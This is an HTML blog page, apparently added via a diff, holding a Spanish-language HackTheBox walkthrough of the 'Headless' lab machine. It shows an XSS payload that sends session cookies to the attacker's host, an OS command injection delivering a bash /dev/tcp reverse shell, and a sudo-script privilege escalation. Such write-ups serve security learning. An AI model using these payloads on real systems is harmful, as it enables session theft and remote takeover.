@@ -1,0 +1,1207 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  
+    data-theme-mode="true"
+  
+>
+  <head>
+    <meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/>
+
+
+
+
+
+
+
+  
+
+<title>
+  Headless | Fouen
+</title>
+<meta
+  name="description"
+  content="Web enjoyer"
+/>
+
+
+
+
+
+
+
+
+
+
+<script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"x转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"❗Failed❗\",\"success\":\"Success✔️\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"time\":null}}}");
+</script>
+
+<script>
+  window.siteConfig.swPath = '\/sw.js';
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+    
+  
+
+  
+    
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+
+
+
+
+
+
+  <link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  />
+
+
+
+  
+
+
+
+
+
+
+
+  
+ <link rel="stylesheet" href="/css/loader.min.2ad0e9bbffb534e893c0ecefc44787a277cf851387e8ad9dccfbc3a5f0886dbe.css" />
+
+
+
+
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Headless | Fouen" />
+  <meta
+    property="og:description"
+    content="Web enjoyer"
+  />
+  <meta property="og:url" content="https://fouen.github.io/post/hackthebox/headless/" />
+  <meta
+    property="og:site_name"
+    content="Fouen"
+  />
+  <meta
+    property="og:image"
+    content="/images/headless.png"
+  />
+  <meta property="article:author" content="Fouen" />
+  <meta property="article:published_time" content="2024-06-13T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2024-06-13T00:00:00&#43;00:00" />
+  
+    <meta property="article:tag" content="Easy" />
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/headless.png" />
+  
+  
+  
+  
+  
+
+
+
+
+<link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+
+
+
+
+  
+ <link rel="stylesheet" href="/css/main.min.cf73cf27e77f9541bc095208d0043dec410884804c1a00da7edb60b4436a1047.css" />
+
+
+
+
+
+  <link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+
+
+
+
+
+  <link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+  
+
+
+  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />
+
+
+
+
+
+    
+  </head>
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <img src="/images/perfilsinfondo.png" alt="loading" />
+        
+      </div>
+      <div class="loading-word">...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+  <div class="notification-wrapper">
+    <h1>New version found</h1>
+    <p>The website seems to have new content, do you want to update?</p>
+    <div class="notification-btn">
+      <button id="notification-update-btn">Update</button>
+      <button id="notification-close-btn">Cancel</button>
+    </div>
+  </div>
+
+    <div id="container">
+      <div id="wrap">
+        
+<div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '>
+          
+            &#xe632;
+          
+        </div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '>
+          
+            &#xe62f;
+          
+        </div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+    <picture></picture>
+      <img fetchpriority="high" src="/images/headless.png" alt="Headless">
+    
+  
+
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          
+        
+  
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Headless</h1>
+          </a>
+        
+      
+  
+      
+        
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+        <div id="content"
+          class="sidebar-left"
+            >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    >
+      
+        <div class="sidebar-toc-sidebar">
+          <div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+      </ul>
+    </li>
+    <li><a href="#intrusión">Intrusión</a>
+      <ul>
+        <li><a href="#xss">XSS</a></li>
+      </ul>
+    </li>
+    <li><a href="#explotación">Explotación</a>
+      <ul>
+        <li><a href="#os-command-injection">OS Command Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#tty-upgrade">TTY Upgrade</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+        </div>
+        <div class="sidebar-common-sidebar hidden">
+          
+<div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Fouen"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Fouen</div>
+  <div class="sidebar-description">Web enjoyer</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    
+    <div class="sidebar-state-number">11</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/FOUEN"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+    <div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe632;
+        
+      </div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe62f;
+        
+      </div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+</div>
+
+        </div>
+      
+
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+    
+  </div>
+</aside>
+
+          <section id="main">
+  <article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta">
+      <div class="article-date">
+  <a
+    href="https://fouen.github.io/post/hackthebox/headless/"
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-06-13 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2024-06-13</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2024-06-13</time
+    >
+  </a>
+</div>
+
+      <div class="article-category">
+  
+    <a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    >
+  
+</div>
+
+    </div>
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="reconocimiento">
+<a class="header-anchor" href="#reconocimiento"></a>
+Reconocimiento
+</h2><h3 id="nmap">
+<a class="header-anchor" href="#nmap"></a>
+Nmap
+</h3><p>Escaneamos la maquina para ver que puertos tiene abiertos;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -p- --open --min-rate <span style="color:#ae81ff">5000</span> -Pn -n 10.10.11.8
+</span></span></code></pre></div><p><img src="20240612214344.png" alt="img"></p>
+<p>Vemos que tiene el puerto <code>22</code> y <code>5000</code></p>
+<p>Suponemos que el puerto <code>5000</code> es de una web, vamos al navegador y ponemos la ip con el puerto <code>5000</code>:
+<img src="20240612214814.png" alt="img"></p>
+<p>Vamos a hacer <strong>fuzzing</strong> para ver que directorios podemos encontrar:</p>
+<h3 id="gobuster">
+<a class="header-anchor" href="#gobuster"></a>
+Gobuster
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://headless.htb:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span>
+</span></span></code></pre></div><p><img src="20240612215308.png" alt="img"></p>
+<p>Vemos 2 directorios vamos a ver que tiene cada uno:</p>
+<hr>
+<p><code>/support</code>:</p>
+<p><img src="20240612215607.png" alt="img"></p>
+<p>Muy interesante esta página podemos enviar información</p>
+<hr>
+<p><code>/dashboard</code>:</p>
+<p><img src="20240612215721.png" alt="img"></p>
+<p>Podemos ver que aquí no tenemos permiso de momento</p>
+<hr>
+<h2 id="intrusión">
+<a class="header-anchor" href="#intrusi%c3%b3n"></a>
+Intrusión
+</h2><p>Hemos visto que en <code>/support</code> hay un panel de soporte para enviar información, vamos a intentar un XSS para intentar robar alguna <strong>cookie</strong> de sesión:</p>
+<p>Primero nos abrimos un servidor en <em>python</em> para que nos llegue la cookie:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>m http<span style="color:#f92672">.</span>server
+</span></span></code></pre></div><p><img src="20240612220204.png" alt="img"></p>
+<h3 id="xss">
+<a class="header-anchor" href="#xss"></a>
+XSS
+</h3><p>Ahora definimos el XSS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;http://10.10.15.68/?coockie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p>Con todo esto vamos a intentar robar alguna cookie:</p>
+<p><img src="20240612220431.png" alt="img"></p>
+<p>Que interesante nos ha bloqueado estas entradas para el XSS</p>
+<p>Vamos a pasar la petición por Burpsuite:</p>
+<p><img src="20240612220620.png" alt="img"></p>
+<p>Visto esto vamos a intentar el mismo XSS pero en los demás campos:</p>
+<p><img src="20240612220851.png" alt="img"></p>
+<p>Hemos probado en el User-Agent y nos ha llegado la cookie al servidor:</p>
+<p><img src="20240612220935.png" alt="img"></p>
+<p>Con esta cookie de sesión vamos a probar a entrar al <code>/dashboard</code>:</p>
+<p><img src="20240612221128.png" alt="img"></p>
+<p>Efectivamente tenemos acceso</p>
+<h2 id="explotación">
+<a class="header-anchor" href="#explotaci%c3%b3n"></a>
+Explotación
+</h2><p>Ahora que somos admin vemos una nueva pagina, vamos a pasar la petición del botón por Burpsuite:</p>
+<p><img src="20240612221905.png" alt="img"></p>
+<h3 id="os-command-injection">
+<a class="header-anchor" href="#os-command-injection"></a>
+OS Command Injection
+</h3><p>Por la estructura vemos que puede ser un <code>OS command injection</code>en el apartado de <em>date</em>, vamos a intentar ejecutar algún comando:</p>
+<p><img src="20240612222126.png" alt="img"></p>
+<p>Efectivamente podemos inyectar comandos</p>
+<p>Con esto vamos a pasarnos una shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.15.68/443 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></div><p>La url encodeamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bash+-c+<span style="color:#e6db74">&#34;bash+-i+&gt;%26+/dev/tcp/10.10.15.68/443+0&gt;%261&#34;</span>
+</span></span></code></pre></div><p>Primero nos ponemos en escucha por el puerto 443:</p>
+<p><code>nc lvnp 443</code></p>
+<p><img src="20240612222608.png" alt="img">
+Tenemos acceso!</p>
+<h2 id="tty-upgrade">
+<a class="header-anchor" href="#tty-upgrade"></a>
+TTY Upgrade
+</h2><p><code>script /dev/null -c bash</code>
+<code>^z</code>
+<code>stty raw -echo; fg</code>
+<code>reset</code>
+<code>xterm</code>
+<code>export TERM=xterm SHELL=bash</code></p>
+<p>Ya tenemos la user flag:</p>
+<p><img src="20240612222904.png" alt="img"></p>
+<h2 id="escalada-de-privilegios">
+<a class="header-anchor" href="#escalada-de-privilegios"></a>
+Escalada de Privilegios
+</h2><p>Ponemos <code>sudo -l</code>  para ver si hay algo que se pueda ejecutar como <code>sudo</code> sin contraseña:</p>
+<p><img src="20240612223051.png" alt="img"></p>
+<p>Efectivamente vamos a ver por dentro ese programa para ver como poder inyectar una bash:</p>
+<p><img src="20240612223200.png" alt="img"></p>
+<p>Ahí podemos ver que si no hay <code>/usr/bin/pgrep</code> se ejecuta <em>initdb.sh</em>, vamos a poner <code>/bin/bash</code>dentro de <em>initdb.sh</em> y permisos de ejecución:</p>
+<p><img src="20240612223435.png" alt="img"></p>
+<p><code>chmod +x initdb.sh</code></p>
+<p>Ahora vamos a probar de ser root:</p>
+<p><img src="20240612223717.png" alt="img">
+Ya está!</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      <ul class="article-tag-list" itemprop="keywords">
+  
+    <li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/easy"
+        rel="tag"
+        >EASY</a
+      >
+    </li>
+  
+</ul>
+
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+
+
+<footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+      2024 -
+      2026
+      <span class="footer-info-sep "></span>
+      Fouen
+    </div>
+    
+    
+      <div>
+        <span class="icon-brush"
+          >&nbsp;
+            7.7k
+          </span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;
+          
+          
+
+          00:41
+        </span>
+      </div>
+    
+    
+    
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar">
+        <div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#gobuster">Gobuster</a></li>
+      </ul>
+    </li>
+    <li><a href="#intrusión">Intrusión</a>
+      <ul>
+        <li><a href="#xss">XSS</a></li>
+      </ul>
+    </li>
+    <li><a href="#explotación">Explotación</a>
+      <ul>
+        <li><a href="#os-command-injection">OS Command Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#tty-upgrade">TTY Upgrade</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+      </div>
+      <div class="sidebar-common-sidebar hidden">
+        
+<div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Fouen"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Fouen</div>
+  <div class="sidebar-description">Web enjoyer</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    
+    <div class="sidebar-state-number">11</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/FOUEN"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+    <div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe632;
+        
+      </div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe62f;
+        
+      </div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+</div>
+
+      </div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div>
+    
+    
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
+  ></script>
+
+
+
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+
+
+
+
+  
+      
+      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+
+
+
+
+
+  
+      
+      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
+      
+
+
+
+  <script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "",
+        apiKey: "",
+        indexName: "",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": ".....",
+          "hits_empty": "No data for ${query}",
+          "hits_stats": ""
+        }
+      }
+    };
+  </script>
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    defer
+    
+    
+    
+    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
+  ></script>
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
+    defer
+    
+    
+    
+    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
+  ></script>
+
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+        
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Fouen",
+          title: "Headless",
+          url: "https:\/\/fouen.github.io\/post\/hackthebox\/headless\/",
+          description: "\rReconocimiento\rNmap\rEscaneamos la maquina para ver que puertos tiene abiertos;\nnmap -p- --open --min-rate 5000 -Pn -n 10.10.11.8 Vemos que tiene el puerto 22 y 5000\nSuponemos que el puerto 5000 es de una web, vamos al navegador y ponemos la ip con el puerto 5000: Vamos a hacer fuzzing para ver que …",
+          cover: "https:\/\/fouen.github.io\/images\/headless.png",
+        };
+      </script>
+    
+    
+    
+      
+
+
+
+
+
+  
+      
+      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
+      
+
+      
+      
+      
+      
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;
+
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    
+    
+  </div>
+</div>
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+       
+         
+      
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+<script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script>
+
+
+
+
+  </body>
+</html>
